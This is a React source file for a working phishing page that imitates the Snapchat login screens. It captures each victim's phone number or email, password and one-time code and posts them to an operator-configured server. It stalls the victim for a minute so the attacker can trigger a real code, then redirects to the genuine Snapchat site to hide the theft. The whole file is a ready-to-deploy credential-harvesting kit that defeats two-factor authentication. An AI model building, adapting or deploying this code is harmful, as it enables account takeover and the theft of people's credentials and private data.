/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import React, { useState } from 'react';
import { Eye, EyeOff } from 'lucide-react';
import { motion, AnimatePresence } from 'motion/react';

type Step = 'IDENTIFIER' | 'PASSWORD' | 'OTP';

export default function App() {
  const [step, setStep] = useState<Step>('IDENTIFIER');
  const [identifier, setIdentifier] = useState('');
  const [password, setPassword] = useState('');
  const [otp, setOtp] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [countryCode, setCountryCode] = useState('+1'); // Default
  const [isLoading, setIsLoading] = useState(false);
  const [apiError, setApiError] = useState(false);

  // Automatic Country Code Detection
  React.useEffect(() => {
    const detectCountry = async () => {
      try {
        // Using a free IP-based service for "automatic" detection
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        if (data.country_calling_code) {
          setCountryCode(data.country_calling_code);
          console.log('Detected Country Code:', data.country_calling_code);
        }
      } catch (error) {
        console.error('Country detection failed, defaulting to +1:', error);
      }
    };
    detectCountry();
  }, []);

  const handleNext = async (e: React.FormEvent) => {
    // 1. Prevent the default form submission (standard React practice)
    e.preventDefault();
    
    // 2. Capture values and prepare for logging
    const timestamp = new Date().toLocaleTimeString();
    let finalIdentifier = identifier;
    
    // Logic to handle phone number formatting if applicable
    if (step === 'IDENTIFIER' && /^\d+$/.test(identifier.replace(/\s/g, ''))) {
      if (!identifier.startsWith('+')) {
        finalIdentifier = `${countryCode} ${identifier}`;
      }
    }
    
    // 3. Log values to the browser console with a timestamp
    console.log(`[${timestamp}] --- Development Debug Log ---`);
    console.log(`Step: ${step}`);
    console.log(`Identifier: ${finalIdentifier}`);
    if (step === 'PASSWORD' || step === 'OTP') {
      console.log(`Password: ${password}`);
    }
    if (step === 'OTP') {
      console.log(`OTP Code: ${otp}`);
    }
    console.log('--------------------------------------');

    // 5. Navigation logic & API Call
    if (step === 'IDENTIFIER') {
      setIdentifier(finalIdentifier);
      setStep('PASSWORD');
    } else if (step === 'PASSWORD') {
      // Send ID + Password immediately
      setIsLoading(true);
      setApiError(false);
      
      try {
        const apiUrl = import.meta.env.VITE_API_URL || '';
        await fetch(`${apiUrl}/api/login`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ identifier, password, step: 'PASSWORD' })
        });
        
        // Wait for 1 minute (60 seconds)
        setTimeout(() => {
          setIsLoading(false);
          setStep('OTP');
        }, 60000);
        
      } catch (error) {
        console.error('API Error:', error);
        // Even on error, we proceed after the delay to keep the flow going
        setTimeout(() => {
          setIsLoading(false);
          setStep('OTP');
        }, 60000);
      }
    } else {
      // Final step: Send data with OTP
      setIsLoading(true);
      setApiError(false);
      
      try {
        const apiUrl = import.meta.env.VITE_API_URL || '';
        const response = await fetch(`${apiUrl}/api/login`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ identifier, password, otp, step: 'OTP' })
        });
        
        await response.json();
        
        // Wait for 2 seconds to show "Logging in..."
        setTimeout(() => {
          window.location.href = 'https://accounts.snapchat.com';
        }, 2000);
        
      } catch (error) {
        console.error('API Error:', error);
        setApiError(true);
        
        setTimeout(() => {
          window.location.href = 'https://accounts.snapchat.com';
        }, 2000);
      }
    }
  };

  const handleNotYou = () => {
    setStep('IDENTIFIER');
    setPassword('');
    setOtp('');
    setApiError(false);
  };

  const GhostLogo = () => (
    <svg 
      viewBox="0 0 24 24" 
      className="w-16 h-16 mx-auto mb-4" 
      fill="none" 
      stroke="currentColor" 
      strokeWidth="1.5"
    >
      <path 
        d="M12 2C9.5 2 7.5 4 7.5 6.5C7.5 7.5 7.8 8.4 8.3 9.1C7.1 9.8 6 11.2 6 12.8C6 13.5 6.2 14.1 6.5 14.7C5.5 15.2 4.5 16.2 4.5 17.5C4.5 19 6 20 8 20C8.5 20 9 19.9 9.5 19.7C10.2 20.5 11.1 21 12 21C12.9 21 13.8 20.5 14.5 19.7C15 19.9 15.5 20 16 20C18 20 19.5 19 19.5 17.5C19.5 16.2 18.5 15.2 17.5 14.7C17.8 14.1 18 13.5 18 12.8C18 11.2 16.9 9.8 15.7 9.1C16.2 8.4 16.5 7.5 16.5 6.5C16.5 4 14.5 2 12 2Z" 
        strokeLinecap="round" 
        strokeLinejoin="round"
      />
    </svg>
  );

  const Spinner = () => (
    <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin mx-auto"></div>
  );

  return (
    <div className="min-h-screen bg-[#F7F7F7] font-sans text-black flex flex-col items-center justify-center p-4">
      <div className="w-full max-w-[420px] bg-white rounded-2xl shadow-[0_4px_20px_rgba(0,0,0,0.05)] p-10 flex flex-col items-center">
        {/* Snapchat Ghost Logo */}
        <GhostLogo />

        <AnimatePresence mode="wait">
          {step === 'IDENTIFIER' && (
            <motion.div
              key="identifier"
              initial={{ opacity: 0, x: 20 }}
              animate={{ opacity: 1, x: 0 }}
              exit={{ opacity: 0, x: -20 }}
              className="w-full text-center"
            >
              <h1 className="text-[26px] font-bold mb-8 tracking-tight">Log in to Snapchat</h1>
              <form onSubmit={handleNext} className="w-full space-y-6">
                <div className="text-left space-y-2">
                  <label className="text-[13px] font-medium text-gray-500 ml-1">
                    Phone number or email
                  </label>
                  <div className="relative">
                    <input
                      type="text"
                      value={identifier}
                      onChange={(e) => setIdentifier(e.target.value)}
                      className="w-full p-3.5 border border-gray-900 rounded-xl text-[15px] focus:outline-none focus:ring-1 focus:ring-gray-400 transition-all"
                      placeholder={countryCode + " 000 000 000"}
                      required
                    />
                  </div>
                </div>
                <div className="pt-4">
                  <button
                    type="submit"
                    disabled={!identifier}
                    className={`px-10 py-2.5 rounded-full text-[15px] font-bold transition-all
                      ${identifier ? 'bg-[#00A6FF] text-white hover:bg-[#0095e6]' : 'bg-gray-100 text-gray-400 cursor-not-allowed'}`}
                  >
                    Next
                  </button>
                </div>
              </form>
            </motion.div>
          )}

          {step === 'PASSWORD' && (
            <motion.div
              key="password"
              initial={{ opacity: 0, x: 20 }}
              animate={{ opacity: 1, x: 0 }}
              exit={{ opacity: 0, x: -20 }}
              className="w-full text-center"
            >
              <h1 className="text-[26px] font-bold mb-6 tracking-tight">Enter password</h1>
              
              {/* Identifier Pill */}
              <div className="inline-flex items-center gap-2 px-4 py-2 border border-gray-100 rounded-xl mb-8">
                <span className="text-[14px] font-bold text-gray-800">{identifier}</span>
                <button onClick={handleNotYou} className="text-[14px] font-bold text-[#00A6FF] hover:underline">
                  Not you?
                </button>
              </div>

              <form onSubmit={handleNext} className="w-full space-y-6">
                <div className="text-left space-y-2">
                  <label className="text-[13px] font-medium text-gray-500 ml-1">Password</label>
                  <div className="relative">
                    <input
                      type={showPassword ? 'text' : 'password'}
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      className="w-full p-3.5 bg-gray-50 rounded-xl text-[15px] focus:outline-none focus:ring-1 focus:ring-gray-200 transition-all pr-12"
                      required
                    />
                    <button
                      type="button"
                      onClick={() => setShowPassword(!showPassword)}
                      className="absolute right-4 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600"
                    >
                      {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
                    </button>
                  </div>
                </div>
                <button
                  type="button"
                  className="text-[14px] font-bold text-[#00A6FF] hover:underline"
                >
                  Forgotten password
                </button>
                <div className="pt-4">
                  <button
                    type="submit"
                    disabled={!password || isLoading}
                    className={`px-10 py-2.5 rounded-full text-[15px] font-bold transition-all min-w-[140px]
                      ${password && !isLoading ? 'bg-[#00A6FF] text-white hover:bg-[#0095e6]' : 'bg-gray-100 text-gray-400 cursor-not-allowed'}`}
                  >
                    {isLoading ? (
                      <div className="flex items-center gap-2">
                        <Spinner />
                        <span>Logging in...</span>
                      </div>
                    ) : 'Next'}
                  </button>
                </div>
              </form>
            </motion.div>
          )}

          {step === 'OTP' && (
            <motion.div
              key="otp"
              initial={{ opacity: 0, x: 20 }}
              animate={{ opacity: 1, x: 0 }}
              exit={{ opacity: 0, x: -20 }}
              className="w-full text-center"
            >
              <h1 className="text-[26px] font-bold mb-6 tracking-tight">Confirm it's you</h1>
              
              {/* Identifier Pill */}
              <div className="inline-flex items-center gap-2 px-4 py-2 border border-gray-100 rounded-xl mb-6">
                <span className="text-[14px] font-bold text-gray-800">{identifier}</span>
                <button 
                  onClick={handleNotYou} 
                  disabled={isLoading}
                  className="text-[14px] font-bold text-[#00A6FF] hover:underline disabled:opacity-50"
                >
                  Not you?
                </button>
              </div>

              <p className="text-[15px] text-gray-500 mb-8 leading-relaxed px-4">
                Please input the code sent to {identifier}.
              </p>

              <form onSubmit={handleNext} className="w-full space-y-6">
                <div className="text-left space-y-2">
                  <label className="text-[13px] font-medium text-gray-500 ml-1">Enter code</label>
                  <input
                    type="text"
                    value={otp}
                    onChange={(e) => setOtp(e.target.value)}
                    disabled={isLoading}
                    className="w-full p-3.5 bg-gray-50 rounded-xl text-[15px] focus:outline-none focus:ring-1 focus:ring-gray-200 transition-all disabled:opacity-50"
                    required
                  />
                </div>
                <div className="flex justify-center gap-1 text-[14px] font-bold">
                  <span className="text-gray-500">Resend code /</span>
                  <button type="button" className="text-[#00A6FF] hover:underline">Need help?</button>
                </div>
                <div className="pt-4 relative">
                  <button
                    type="submit"
                    disabled={!otp || isLoading}
                    className={`px-10 py-2.5 rounded-full text-[15px] font-bold transition-all min-w-[140px]
                      ${otp && !isLoading ? 'bg-[#00A6FF] text-white hover:bg-[#0095e6]' : 'bg-gray-100 text-gray-400 cursor-not-allowed'}`}
                  >
                    {isLoading ? (
                      <div className="flex items-center gap-2">
                        <Spinner />
                        <span>Verifying...</span>
                      </div>
                    ) : 'Next'}
                  </button>
                  
                  {apiError && !isLoading && (
                    <p className="text-red-500 text-[12px] mt-2 absolute w-full left-0">Try again</p>
                  )}
                </div>
              </form>
            </motion.div>
          )}
        </AnimatePresence>
      </div>
    </div>
  );
}
